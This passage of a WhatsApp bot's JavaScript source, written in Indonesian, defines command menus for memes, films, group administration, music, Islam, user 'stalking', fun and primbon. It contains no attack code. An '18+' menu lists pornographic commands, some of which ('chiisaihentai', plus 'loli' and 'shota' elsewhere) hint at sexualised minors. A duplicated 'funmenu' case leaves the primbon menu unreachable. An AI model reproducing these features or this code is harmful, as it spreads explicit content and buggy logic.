					zaki.sendMessage(from, download, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//mememenu
	case 'mememenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const meme = `╭─────────────────────
│   「 MEME MENU 」
│─────────────────────
│❏ \`\`\`${prefix}memeindo\`\`\`
│❏ \`\`\`${prefix}meme\`\`\`
│❏ \`\`\`${prefix}darkjokes\`\`\`
╰────────────────────`
					zaki.sendMessage(from, meme, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  
//mememenu
	case 'filmmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const film = `╭─────────────────────
│   「 FILM MENU 」
│─────────────────────
│❏ \`\`\`${prefix}film\`\`\`
│❏ \`\`\`${prefix}film2\`\`\`
│❏ \`\`\`${prefix}searchfilm\`\`\`
│❏ \`\`\`${prefix}filmapikterbaru\`\`\`
│❏ \`\`\`${prefix}filmapikdrama\`\`\`
│❏ \`\`\`${prefix}lk21\`\`\`
╰────────────────────`
					zaki.sendMessage(from, film, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  
//GROUPMENU
	case 'groupmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const group = `╭─────────────────────
│   「 GROUP MENU 」
│─────────────────────
│❏ \`\`\`${prefix}opengc\`\`\`
│❏ \`\`\`${prefix}closegc\`\`\`
│❏ \`\`\`${prefix}tagall\`\`\`
│❏ \`\`\`${prefix}hidetag\`\`\`
│❏ \`\`\`${prefix}sticktag\`\`\`
│❏ \`\`\`${prefix}imgtag\`\`\`
│❏ \`\`\`${prefix}kontag\`\`\`
│❏ \`\`\`${prefix}totag\`\`\`
│❏ \`\`\`${prefix}lb [ LEADERBOARD ]\`\`\` 
│❏ \`\`\`${prefix}add [ 12345678 ]\`\`\`
│❏ \`\`\`${prefix}kick [ @tag ]\`\`\`
│❏ \`\`\`${prefix}listadmins\`\`\`
│❏ \`\`\`${prefix}linkgroup\`\`\`
│❏ \`\`\`${prefix}delete\`\`\`
│❏ \`\`\`${prefix}notif\`\`\`
│❏ \`\`\`${prefix}leave\`\`\`
│❏ \`\`\`${prefix}tagme\`\`\`
│❏ \`\`\`${prefix}afk [ alasan ]\`\`\`
│❏ \`\`\`${prefix}welcome [ 1/0 ]\`\`\`
│❏ \`\`\`${prefix}antilinkgroup [ 1/0 ]\`\`\`
│❏ \`\`\`${prefix}antivirtexgroup [ 1/0 ]\`\`\`
│❏ \`\`\`${prefix}simih [ 1/0 ]\`\`\`
│❏ \`\`\`${prefix}nsfw [ 1/0 ]\`\`\`
│❏ \`\`\`${prefix}antibadwordgroup [ enable/disable ]\`\`\`
│❏ \`\`\`${prefix}listbadword ]\`\`\`
│❏ \`\`\`${prefix}closetime [ time ]\`\`\`
│❏ \`\`\`${prefix}opentime [ time ]\`\`\`
╰────────────────────`
					zaki.sendMessage(from, group, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//musicmenu
	case 'musicmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const music = `╭─────────────────────
│   「 MUSIC MENU 」
│─────────────────────
│❏ \`\`\`${prefix}play [ judul Lagu ]\`\`\`
│❏ \`\`\`${prefix}joox [ judul Lagu ]\`\`\`
│❏ \`\`\`${prefix}lirik [ judul lagu ]\`\`\`
│❏ \`\`\`${prefix}chord [ judul judul ]\`\`\`
╰────────────────────`
					zaki.sendMessage(from, music, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//soundmenu
	case 'soundmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const sound = `╭─────────────────────
│   「 SOUND CHANGER 」
│─────────────────────
│❏ \`\`\`${prefix}tts\`\`\`
│❏ \`\`\`${prefix}slow [ Replyaudio ]\`\`\`
│❏ \`\`\`${prefix}gemuk [ Replyaudio ]\`\`\`
│❏ \`\`\`${prefix}bass [ Replyaudio ]\`\`\`
│❏ \`\`\`${prefix}tupai [ Replyaudio ]\`\`\`
│❏ \`\`\`${prefix}nightcore [ RReplyaudio ]\`\`\`
│❏ \`\`\`${prefix}volume\`\`\`
│❏ \`\`\`${prefix}toptt\`\`\`
│❏ \`\`\`${prefix}ghost\`\`\`
│❏ \`\`\`${prefix}blub\`\`\`
╰────────────────────`
					zaki.sendMessage(from, sound, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//islammenu
	case 'islammenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const islam = `╭─────────────────────
│   「 ISLAM MENU 」
│─────────────────────
│❏ \`\`\`${prefix}quran\`\`\`
│❏ \`\`\`${prefix}jsholat [ daerah ]\`\`\`
│❏ \`\`\`${prefix}asmaulhusna\`\`\`
│❏ \`\`\`${prefix}ayatkursi\`\`\`
│❏ \`\`\`${prefix}bacaansholat\`\`\`
│❏ \`\`\`${prefix}doaharian\`\`\`
│❏ \`\`\`${prefix}kisahnabi\`\`\`
│❏ \`\`\`${prefix}niatsholat\`\`\`
│❏ \`\`\`${prefix}tahlil\`\`\`
│❏ \`\`\`${prefix}wirid\`\`\`
╰────────────────────`
					zaki.sendMessage(from, islam, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//STALKMENU
	case 'stalkmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const stalk = `╭─────────────────────
│   「 STALK MENU 」
│─────────────────────
│❏ \`\`\`${prefix}igstalk [ username ]\`\`\`
│❏ \`\`\`${prefix}tiktokstalk [ uusername ]\`\`\`
│❏ \`\`\`${prefix}steam [ username ]\`\`\`
│❏ \`\`\`${prefix}githubstalk [ uusername ]\`\`\`
│❏ \`\`\`${prefix}twitstalk [ username ]\`\`\`
╰────────────────────`
					zaki.sendMessage(from, stalk, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//18+menu
	case '18+menu':

					if (!isRegister) return reply(mess.only.daftarB)

					const pron = `╭─────────────────────
│   「 18+ MENU 」
│─────────────────────
│❏ \`\`\`${prefix}randomhentai\`\`\`
│❏ \`\`\`${prefix}nsfwneko\`\`\`
│❏ \`\`\`${prefix}nsfwtrap\`\`\`
│❏ \`\`\`${prefix}chiisaihentai\`\`\`
│❏ \`\`\`${prefix}trap\`\`\`
│❏ \`\`\`${prefix}blowjob\`\`\`
│❏ \`\`\`${prefix}yaoi\`\`\`
│❏ \`\`\`${prefix}ecchi\`\`\`
│❏ \`\`\`${prefix}hentai\`\`\`
│❏ \`\`\`${prefix}ahegao\`\`\`
│❏ \`\`\`${prefix}hololewd\`\`\`
│❏ \`\`\`${prefix}sideoppai\`\`\`
│❏ \`\`\`${prefix}animefeets\`\`\`
│❏ \`\`\`${prefix}animebooty\`\`\`
│❏ \`\`\`${prefix}animethighss\`\`\`
│❏ \`\`\`${prefix}hentaiparadise\`\`\`
│❏ \`\`\`${prefix}animearmpits\`\`\`
│❏ \`\`\`${prefix}hentaifemdom\`\`\`
│❏ \`\`\`${prefix}lewdanimegirls\`\`\`
│❏ \`\`\`${prefix}biganimetiddies\`\`\`
│❏ \`\`\`${prefix}animebellybutton\`\`\`
│❏ \`\`\`${prefix}hentai4everyone\`\`\`
│❏ \`\`\`${prefix}waifu\`\`\`
│❏ \`\`\`${prefix}erok\`\`\`
│❏ \`\`\`${prefix}meow\`\`\`
│❏ \`\`\`${prefix}femdom\`\`\`
│❏ \`\`\`${prefix}tickle\`\`\`
│❏ \`\`\`${prefix}classic\`\`\`
│❏ \`\`\`${prefix}ngif\`\`\`
│❏ \`\`\`${prefix}erofeet\`\`\`
│❏ \`\`\`${prefix}meow\`\`\`
│❏ \`\`\`${prefix}poke\`\`\`
│❏ \`\`\`${prefix}les\`\`\`
│❏ \`\`\`${prefix}hololewd\`\`\`
│❏ \`\`\`${prefix}lewdk\`\`\`
│❏ \`\`\`${prefix}keta\`\`\`
│❏ \`\`\`${prefix}feetg\`\`\`
│❏ \`\`\`${prefix}nsfw_neko_gif\`\`\`
│❏ \`\`\`${prefix}eroyuri\`\`\`
│❏ \`\`\`${prefix}kiss\`\`\`
│❏ \`\`\`${prefix}8ball\`\`\`
│❏ \`\`\`${prefix}kuni\`\`\`
│❏ \`\`\`${prefix}tits\`\`\`
│❏ \`\`\`${prefix}pussy_jpg\`\`\`
│❏ \`\`\`${prefix}cum_jpg\`\`\`
│❏ \`\`\`${prefix}pussy\`\`\`
│❏ \`\`\`${prefix}lewdkemo\`\`\`
│❏ \`\`\`${prefix}lizard\`\`\`
│❏ \`\`\`${prefix}slap\`\`\`
│❏ \`\`\`${prefix}lewd\`\`\`
│❏ \`\`\`${prefix}cum\`\`\`
│❏ \`\`\`${prefix}cuddle\`\`\`
│❏ \`\`\`${prefix}spank\`\`\`
│❏ \`\`\`${prefix}mallboobs\`\`\`
│❏ \`\`\`${prefix}goose\`\`\`
│❏ \`\`\`${prefix}random_hentai_gif\`\`\`
│❏ \`\`\`${prefix}avatar\`\`\`
│❏ \`\`\`${prefix}fox_girl\`\`\`
│❏ \`\`\`${prefix}nsfw_avatar\`\`\`
│❏ \`\`\`${prefix}hug\`\`\`
│❏ \`\`\`${prefix}gecg\`\`\`
│❏ \`\`\`${prefix}boobs\`\`\`
│❏ \`\`\`${prefix}pat\`\`\`
│❏ \`\`\`${prefix}feet\`\`\`
│❏ \`\`\`${prefix}smug\`\`\`
│❏ \`\`\`${prefix}kemonomimi\`\`\`
│❏ \`\`\`${prefix}solog\`\`\`
│❏ \`\`\`${prefix}holo\`\`\`
│❏ \`\`\`${prefix}holo\`\`\`
│❏ \`\`\`${prefix}wallpaper\`\`\`
│❏ \`\`\`${prefix}bj\`\`\`
│❏ \`\`\`${prefix}woof\`\`\`
│❏ \`\`\`${prefix}yuri\`\`\`
│❏ \`\`\`${prefix}trap\`\`\`
│❏ \`\`\`${prefix}anal\`\`\`
│❏ \`\`\`${prefix}baka\`\`\`
│❏ \`\`\`${prefix}blowjob\`\`\`
│❏ \`\`\`${prefix}holoero\`\`\`
│❏ \`\`\`${prefix}feed\`\`\`
│❏ \`\`\`${prefix}neko\`\`\`
│❏ \`\`\`${prefix}gasm\`\`\`
│❏ \`\`\`${prefix}hentai\`\`\`
│❏ \`\`\`${prefix}futanari\`\`\`
│❏ \`\`\`${prefix}ero\`\`\`
│❏ \`\`\`${prefix}solo\`\`\`
│❏ \`\`\`${prefix}waifu\`\`\`
│❏ \`\`\`${prefix}pwankg\`\`\`
│❏ \`\`\`${prefix}eron\`\`\`
│❏ \`\`\`${prefix}erokemo\`\`\`
│❏ \`\`\`${prefix}bj\`\`\`
│❏ \`\`\`${prefix}ero\`\`\`
│❏ \`\`\`${prefix}cum\`\`\`
│❏ \`\`\`${prefix}feet\`\`\`
│❏ \`\`\`${prefix}yuri\`\`\`
│❏ \`\`\`${prefix}trap\`\`\`
│❏ \`\`\`${prefix}lewd\`\`\`
│❏ \`\`\`${prefix}feed\`\`\`
│❏ \`\`\`${prefix}eron\`\`\`
│❏ \`\`\`${prefix}solo\`\`\`
│❏ \`\`\`${prefix}gasm\`\`\`
│❏ \`\`\`${prefix}poke\`\`\`
│❏ \`\`\`${prefix}anal\`\`\`
│❏ \`\`\`${prefix}holo\`\`\`
│❏ \`\`\`${prefix}tits\`\`\`
│❏ \`\`\`${prefix}kuni\`\`\`
│❏ \`\`\`${prefix}kiss\`\`\`
│❏ \`\`\`${prefix}erok\`\`\`
│❏ \`\`\`${prefix}smug\`\`\`
│❏ \`\`\`${prefix}baka\`\`\`
│❏ \`\`\`${prefix}solog\`\`\`
│❏ \`\`\`${prefix}feetg\`\`\`
│❏ \`\`\`${prefix}lewdk\`\`\`
│❏ \`\`\`${prefix}waifu\`\`\`
│❏ \`\`\`${prefix}pussy\`\`\`
│❏ \`\`\`${prefix}femdom\`\`\`
│❏ \`\`\`${prefix}cuddle\`\`\`
│❏ \`\`\`${prefix}hentai\`\`\`
│❏ \`\`\`${prefix}eroyuri\`\`\`
│❏ \`\`\`${prefix}cum_jpg\`\`\`
│❏ \`\`\`${prefix}blowjob\`\`\`
│❏ \`\`\`${prefix}erofeet\`\`\`
│❏ \`\`\`${prefix}holoero\`\`\`
│❏ \`\`\`${prefix}classic\`\`\`
│❏ \`\`\`${prefix}erokemo\`\`\`
│❏ \`\`\`${prefix}fox_girl\`\`\`
│❏ \`\`\`${prefix}futanari\`\`\`
│❏ \`\`\`${prefix}lewdkemo\`\`\`
│❏ \`\`\`${prefix}wallpaper\`\`\`
│❏ \`\`\`${prefix}pussy_jpg\`\`\`
│❏ \`\`\`${prefix}kemonomimi\`\`\`
│❏ \`\`\`${prefix}nsfw_avatar\`\`\`
│❏ \`\`\`${prefix}bokep\`\`\`
│❏ \`\`\`${prefix}xnxx\`\`\`
│❏ \`\`\`${prefix}xnxxsearch\`\`\`
│❏ \`\`\`${prefix}xhamster\`\`\`
│❏ \`\`\`${prefix}xhamstersearch\`\`\`
│❏ \`\`\`${prefix}nhentaisearch\`\`\`
│❏ \`\`\`${prefix}nhentai\`\`\`
│❏ \`\`\`${prefix}nhentaipdf\`\`\`
│❏ \`\`\`${prefix}nekopoi\`\`\`
│❏ \`\`\`${prefix}nekopoisearch\`\`\`
│❏ \`\`\`${prefix}pornhubsearch\`\`\`
╰────────────────────`
					zaki.sendMessage(from, pron, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//ONGOINGMENU
	case 'ongoingmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const ongoing = `╭─────────────────────
│  「 ONGOING MENU 」
│─────────────────────
│❏ \`\`\`${prefix}drakor\`\`\`
│❏ \`\`\`${prefix}otakudesu\`\`\`
│❏ \`\`\`${prefix}anoboy\`\`\`
╰────────────────────`
					zaki.sendMessage(from,  ongoing, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//WINU MENU
	case 'wibumenu':
					if (!isRegister) return reply(mess.only.daftarB)

					const wibu = `╭─────────────────────
│   「 WIBU MENU 」
│─────────────────────
│❏ \`\`\`${prefix}kusonime [ query ]\`\`\`
│❏ \`\`\`${prefix}animecry\`\`\`
│❏ \`\`\`${prefix}wwai\`\`\`
│❏ \`\`\`${prefix}waifu\`\`\`
│❏ \`\`\`${prefix}neko\`\`\`
│❏ \`\`\`${prefix}loli\`\`\`
│❏ \`\`\`${prefix}husbu\`\`\`
│❏ \`\`\`${prefix}husbu2\`\`\`
│❏ \`\`\`${prefix}shota\`\`\`
│❏ \`\`\`${prefix}pokemon\`\`\`
│❏ \`\`\`${prefix}anime\`\`\`
│❏ \`\`\`${prefix}nekonime\`\`\`
│❏ \`\`\`${prefix}kaneki\`\`\`
│❏ \`\`\`${prefix}sarada\`\`\`
│❏ \`\`\`${prefix}miku\`\`\`
│❏ \`\`\`${prefix}sasuke\`\`\`
│❏ \`\`\`${prefix}yotsuba\`\`\`
│❏ \`\`\`${prefix}naruto\`\`\`
│❏ \`\`\`${prefix}levi\`\`\`
│❏ \`\`\`${prefix}sakura\`\`\`
│❏ \`\`\`${prefix}boruto\`\`\`
│❏ \`\`\`${prefix}minato\`\`\`
│❏ \`\`\`${prefix}todoroki\`\`\`
│❏ \`\`\`${prefix}kurumi\`\`\`
│❏ \`\`\`${prefix}rikka\`\`\`
│❏ \`\`\`${prefix}kaneki\`\`\`
│❏ \`\`\`${prefix}mikasa\`\`\`
│❏ \`\`\`${prefix}hinata\`\`\`
│❏ \`\`\`${prefix}hancock\`\`\`
│❏ \`\`\`${prefix}nicorobin\`\`\`
│❏ \`\`\`${prefix}itadori\`\`\`
│❏ \`\`\`${prefix}draken\`\`\`
│❏ \`\`\`${prefix}rem\`\`\`
│❏ \`\`\`${prefix}kanna\`\`\`
│❏ \`\`\`${prefix}wallanime\`\`\`
│❏ \`\`\`${prefix}wallpaperanime\`\`\`
│❏ \`\`\`${prefix}nekonime\`\`\`
│❏ \`\`\`${prefix}neko\`\`\`
│❏ \`\`\`${prefix}miyauchi\`\`\`
│❏ \`\`\`${prefix}chinokaffu\`\`\`
│❏ \`\`\`${prefix}akame\`\`\`
│❏ \`\`\`${prefix}oreki\`\`\`
│❏ \`\`\`${prefix}todoroki\`\`\`
│❏ \`\`\`${prefix}shoto\`\`\`
│❏ \`\`\`${prefix}deku\`\`\`
│❏ \`\`\`${prefix}mitsuha\`\`\`
│❏ \`\`\`${prefix}kiminonawa\`\`\`
│❏ \`\`\`${prefix}mitsuha\`\`\`
│❏ \`\`\`${prefix}naruto\`\`\`
│❏ \`\`\`${prefix}boruto\`\`\`
│❏ \`\`\`${prefix}sarada\`\`\`
│❏ \`\`\`${prefix}sasuke\`\`\`
│❏ \`\`\`${prefix}hinata\`\`\`
│❏ \`\`\`${prefix}kageyama\`\`\`
│❏ \`\`\`${prefix}tobi\`\`\`
│❏ \`\`\`${prefix}tobio\`\`\`
│❏ \`\`\`${prefix}hyuga\`\`\`
│❏ \`\`\`${prefix}koro\`\`\`
│❏ \`\`\`${prefix}shikamaru\`\`\`
│❏ \`\`\`${prefix}sakura\`\`\` 
│❏ \`\`\`${prefix}bertold\`\`\`
│❏ \`\`\`${prefix}mikasa\`\`\`
│❏ \`\`\`${prefix}ichigo\`\`\`
│❏ \`\`\`${prefix}orihime\`\`\`
│❏ \`\`\`${prefix}levi\`\`\`
│❏ \`\`\`${prefix}lipai\`\`\`
│❏ \`\`\`${prefix}erenyeager\`\`\`
│❏ \`\`\`${prefix}jigen\`\`\`
│❏ \`\`\`${prefix}aestheticpict\`\`\`
│❏ \`\`\`${prefix}luffy\`\`\`
│❏ \`\`\`${prefix}zoro\`\`\`
│❏ \`\`\`${prefix}sanji\`\`\`
│❏ \`\`\`${prefix}nami\`\`\`
│❏ \`\`\`${prefix}roger\`\`\`
│❏ \`\`\`${prefix}nico\`\`\`
│❏ \`\`\`${prefix}misuha\`\`\`
│❏ \`\`\`${prefix}aqua\`\`\`
│❏ \`\`\`${prefix}megumi\`\`\`
│❏ \`\`\`${prefix}megumin\`\`\`
│❏ \`\`\`${prefix}gojo\`\`\`
│❏ \`\`\`${prefix}gojou\`\`\`
│❏ \`\`\`${prefix}eliana\`\`\`
│❏ \`\`\`${prefix}rimuru\`\`\`
╰────────────────────`
					zaki.sendMessage(from, wibu, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//funmenu
	case 'funmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const fun = `╭─────────────────────
│   「 FUN MENU 」
│─────────────────────
│❏ \`\`\`${prefix}truth\`\`\`
│❏ \`\`\`${prefix}dare\`\`\`
│❏ \`\`\`${prefix}tebakgambar\`\`\`
│❏ \`\`\`${prefix}suit\`\`\`
│❏ \`\`\`${prefix}tebakbendera\`\`\`
│❏ \`\`\`${prefix}tebakangka\`\`\`
│❏ \`\`\`${prefix}hobby\`\`\`
│❏ \`\`\`${prefix}watak\`\`\`
│❏ \`\`\`${prefix}gantengcek\`\`\`
│❏ \`\`\`${prefix}jelekcek\`\`\`
│❏ \`\`\`${prefix}gaycek\`\`\`
│❏ \`\`\`${prefix}lesbicek\`\`\`
│❏ \`\`\`${prefix}cantikcek\`\`\`
│❏ \`\`\`${prefix}jelekcek\`\`\`
│❏ \`\`\`${prefix}goblokcek\`\`\`
│❏ \`\`\`${prefix}begocek\`\`\`
│❏ \`\`\`${prefix}pintercek\`\`\`
│❏ \`\`\`${prefix}jagocek\`\`\`
│❏ \`\`\`${prefix}nolepcek\`\`\`
│❏ \`\`\`${prefix}babicek\`\`\`
│❏ \`\`\`${prefix}bebancek\`\`\`
│❏ \`\`\`${prefix}baikcek\`\`\`
│❏ \`\`\`${prefix}jahatcek\`\`\`
│❏ \`\`\`${prefix}anjingcek\`\`\`
│❏ \`\`\`${prefix}haramcek\`\`\`
│❏ \`\`\`${prefix}kontolcek\`\`\`
│❏ \`\`\`${prefix}pakboycek\`\`\`
│❏ \`\`\`${prefix}pakgirlcek\`\`\`
│❏ \`\`\`${prefix}sangecek\`\`\`
│❏ \`\`\`${prefix}bapercek\`\`\`
│❏ \`\`\`${prefix}jadian\`\`\`
│❏ \`\`\`${prefix}ganteng\`\`\`
│❏ \`\`\`${prefix}cantik\`\`\`
│❏ \`\`\`${prefix}jelek\`\`\`
│❏ \`\`\`${prefix}goblok\`\`\`
│❏ \`\`\`${prefix}bego\`\`\`
│❏ \`\`\`${prefix}pinter\`\`\`
│❏ \`\`\`${prefix}jago\`\`\`
│❏ \`\`\`${prefix}babi\`\`\`
│❏ \`\`\`${prefix}beban\`\`\`
│❏ \`\`\`${prefix}baik\`\`\`
│❏ \`\`\`${prefix}jahat\`\`\`
│❏ \`\`\`${prefix}anjing\`\`\`
│❏ \`\`\`${prefix}monyet\`\`\`
│❏ \`\`\`${prefix}haram\`\`\`
│❏ \`\`\`${prefix}kontol\`\`\`
│❏ \`\`\`${prefix}pakboy\`\`\`
│❏ \`\`\`${prefix}pakgirl\`\`\`
│❏ \`\`\`${prefix}sadboy\`\`\`
│❏ \`\`\`${prefix}sadgir\`\`\`
│❏ \`\`\`${prefix}wibu\`\`\`
│❏ \`\`\`${prefix}nolep\`\`\`
│❏ \`\`\`${prefix}hebat\`\`\`
╰────────────────────`
					zaki.sendMessage(from, fun, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//primbonmenu
	case 'funmenu':
					if (!isRegister) return reply(mess.only.daftarB)

					const primbon = `╭─────────────────────
│   「 PRIMBON MENU 」
│─────────────────────
│❏ \`\`\`${prefix}artinama\`\`\`
│❏ \`\`\`${prefix}artimimpi\`\`\`
│❏ \`\`\`${prefix}artijadian\`\`\`
│❏ \`\`\`${prefix}ramalnomer\`\`\`
│❏ \`\`\`${prefix}ramalcinta\`\`\`
│❏ \`\`\`${prefix}jodohbali\`\`\`
│❏ \`\`\`${prefix}ramalnikah\`\`\`
│❏ \`\`\`${prefix}taksirmimpi\`\`\`
╰────────────────────`
					zaki.sendMessage(from, primbon, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//RANDOMMENU
	case 'randommenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const random = `╭─────────────────────
│   「 RANDOM MENU 」
│─────────────────────
│❏ \`\`\`${prefix}cogan\`\`\`
│❏ \`\`\`${prefix}cecan\`\`\`
│❏ \`\`\`${prefix}kpop\`\`\`
│❏ \`\`\`${prefix}bts\`\`\`
│❏ \`\`\`${prefix}asupan\`\`\`
│❏ \`\`\`${prefix}Jungkook\`\`\`
│❏ \`\`\`${prefix}cyberpunk\`\`\`
│❏ \`\`\`${prefix}twit\`\`\`
│❏ \`\`\`${prefix}faktaunik\`\`\`
│❏ \`\`\`${prefix}katailham\`\`\`
│❏ \`\`\`${prefix}katabijak\`\`\`
│❏ \`\`\`${prefix}pantun\`\`\`
│❏ \`\`\`${prefix}motivasi\`\`\`
│❏ \`\`\`${prefix}citacita\`\`\`
│❏ \`\`\`${prefix}wallteknologi\`\`\`
│❏ \`\`\`${prefix}wallhacker\`\`\`
│❏ \`\`\`${prefix}wallcyber\`\`\`
│❏ \`\`\`${prefix}wallmuslim\`\`\`
│❏ \`\`\`${prefix}twich\`\`\`
╰────────────────────`
					zaki.sendMessage(from, random, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//xpmenu
	case 'xpmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const xpmenus = `╭─────────────────────
│     「 XP MENU 」
│─────────────────────
│❏ \`\`\`${prefix}level\`\`\`
│❏ \`\`\`${prefix}leveling [ 1/0 ]\`\`\`
│❏ \`\`\`${prefix}mining\`\`\`
╰────────────────────`
					zaki.sendMessage(from, xpmenus, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//Limitmenu
	case 'limitmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const limitme = `╭─────────────────────
│    「 LIMIT MENU 」
